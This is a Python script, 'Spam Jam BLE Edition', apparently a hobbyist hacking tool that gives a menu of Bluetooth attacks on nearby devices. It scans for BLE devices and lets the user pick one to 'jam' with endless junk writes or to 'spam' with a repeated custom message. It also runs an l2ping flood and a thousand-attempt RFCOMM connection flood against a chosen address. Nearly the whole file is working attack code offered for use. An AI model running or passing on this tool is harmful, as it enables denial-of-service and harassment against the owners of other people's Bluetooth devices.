import os
import sys
import time
import random
import subprocess
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, ADDR_TYPE_RANDOM, BTLEException

# 🎨 Spam Jam & Party Pooper Banner
def print_banner():
    print(r"""
███████╗██████╗  █████╗ ███╗   ███╗         ██╗ █████╗ ███╗   ███╗
██╔════╝██╔══██╗██╔══██╗████╗ ████║         ██║██╔══██╗████╗ ████║
███████╗██████╔╝███████║██╔████╔██║         ██║███████║██╔████╔██║
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██   ██║██╔══██║██║╚██╔╝██║
███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚█████╔╝██║  ██║██║ ╚═╝ ██║
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ 
   ❤️💜 Spam Jam BLE Edition 💜❤️
   👩‍💻 Author: ekoms savior
   🎯 Now with Party Pooper + Custom Attacks! 🎉
   """)
    print("💜 XOXO HACK THE PLANET! 💜\n")

# 🎯 BLE Spamming Class
class BLESpam(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleNotification(self, cHandle, data):
        print(f"🔔 Notification from BLE device: {data}")

# 🚀 BLE Spamming with User Input!
def spam_ble(target_mac):
    print(f"🚀 Spamming device {target_mac} 💥💜")
    custom_message = input("💜 Enter your custom spam message: ").encode()  # User input!

    try:
        peripheral = Peripheral(target_mac, ADDR_TYPE_RANDOM)
        peripheral.setDelegate(BLESpam())
        while True:
            peripheral.writeCharacteristic(0x0001, custom_message)
            print(f"💜 Spammed: {custom_message.decode(errors='ignore')}")
            time.sleep(0.5)
    except Exception as e:
        print(f"⚠️ Error: {e}")

# 🎯 BLE Jamming Function
def jam_ble():
    print("🔎 Scanning for BLE devices to jam 📡")
    scanner = Scanner()
    devices = scanner.scan(10.0)

    for idx, device in enumerate(devices):
        print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")

    if not devices:
        print("⚠️ No BLE devices found. Try again!")
        return

    device_idx = input("💜 Enter the index of the device to jam: ")
    try:
        device_idx = int(device_idx)
        target_device = devices[device_idx].addr
    except (ValueError, IndexError):
        print("⚠️ Invalid index.")
        return

    print(f"💥 Jamming device {target_device} 🚀💜")
    try:
        peripheral = Peripheral(target_device)
        while True:
            junk_data = b'\x00\xFF' * 50
            peripheral.writeCharacteristic(0x000b, junk_data, withResponse=False)
            print(f"🚀 Jammed {target_device} with noise 💜💥")
            time.sleep(0.1)
    except BTLEException as e:
        print(f"⚠️ Failed to jam {target_device}: {e}")

# 🦠 Party Pooper Features 🦠
def start_bluetooth():
    """Start the Bluetooth service if not running."""
    print("📡 Starting Bluetooth service...")
    subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)
    print("✅ Bluetooth service started!")

def scan_bluetooth():
    """Scan for nearby Bluetooth devices."""
    print("🔎 Scanning for Bluetooth devices...")
    subprocess.run(['bluetoothctl', 'scan', 'on'], check=True)

# 💥 CUSTOM L2PING FLOOD ATTACK (NOW FIXED!)
def l2ping_attack():
    """Send a customizable Bluetooth L2Ping flood attack to a target device."""
    addr = input("💜 Enter Bluetooth Device Address to L2Ping: ")
    
    # Check for root privileges
    if os.geteuid() != 0:
        print("⚠️  L2Ping requires root privileges! Try running: sudo python3 spam_jam.py")
        return

    # User-customized attack settings
    packet_size = input("💜 Enter packet size (default 600, max 672): ") or "600"
    
    try:
        packet_size = int(packet_size)
        if packet_size > 672:
            print("⚠️ Packet size too large! Setting to max allowed: 672 bytes.")
            packet_size = 672  # Auto-correct max size!
    except ValueError:
        print("⚠️ Invalid input! Using default size: 600 bytes.")
        packet_size = 600  # Default to 600 if input is bad
    
    attack_mode = input("💜 Flood mode? (y/n): ").lower() == "y"
    
    if attack_mode:
        print(f"💥 Flooding {addr} with {packet_size}-byte L2Ping packets!")
        subprocess.run(['l2ping', '-i', 'hci0', '-s', str(packet_size), '-f', addr], check=True)
    else:
        print(f"💥 Sending single {packet_size}-byte L2Ping packet to {addr}")
        subprocess.run(['l2ping', '-i', 'hci0', '-s', str(packet_size), addr], check=True)

    print("✅ L2Ping attack complete!")

def rfcomm_flood():
    """Flood a Bluetooth device with RFCOMM connection attempts."""
    addr = input("💜 Enter Bluetooth Device Address for RFCOMM Flood: ")
    print(f"💥 Starting RFCOMM connection flood on {addr}...")
    cmd = ['rfcomm', 'connect', addr, '1']

    for i in range(1000):
        try:
            subprocess.run(cmd, check=True)
            print(f"✅ Connected attempt {i+1} to {addr}")
        except subprocess.CalledProcessError:
            print(f"⚠️ Failed attempt {i+1} to connect to {addr}")

# 🏁 Main Function: Choose Feature
def main():
    print_banner()
    print("🔹 1️⃣ Spam a BLE device 💌")
    print("🔹 2️⃣ Jam a BLE device 🚫")
    print("🔹 3️⃣ Scan for Bluetooth devices 📡")
    print("🔹 4️⃣ L2Ping Attack 💥 (Now customizable!)")
    print("🔹 5️⃣ RFCOMM Connection Flood 💥")
    print("🔹 6️⃣ Start Bluetooth Service 📡")
    print("🔹 7️⃣ Quit 🚪")

    choice = input("💜 Choose an option (1-7): ")
    
    if choice == "1":
        target_mac = input("💜 Enter target BLE MAC address: ")
        spam_ble(target_mac)
    elif choice == "2":
        jam_ble()
    elif choice == "3":
        scan_bluetooth()
    elif choice == "4":
        l2ping_attack()
    elif choice == "5":
        rfcomm_flood()
    elif choice == "6":
        start_bluetooth()
    elif choice == "7":
        print("👋 Goodbye, fren! XOXOXO 💜")
        sys.exit()
    else:
        print("⚠️ Invalid choice. Try again! 💜")

if __name__ == "__main__":
    main()
